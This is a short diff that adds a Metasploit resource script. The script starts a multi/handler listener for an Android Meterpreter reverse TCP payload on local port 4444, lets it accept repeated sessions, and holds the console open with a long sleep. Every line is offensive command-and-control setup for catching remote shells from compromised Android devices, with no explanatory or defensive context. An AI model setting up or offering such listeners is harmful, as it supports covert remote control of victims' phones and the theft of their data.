@@ -1,0 +1,11 @@
+# Multi-session handler resource — keeps console ALIVE after job start
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 4444
+set ExitOnSession false
+set SessionRetryTotal 0
+set StagerRetryCount 10
+exploit -j
+# keep the console from exiting: hold with a neverending command
+sleep 100000000
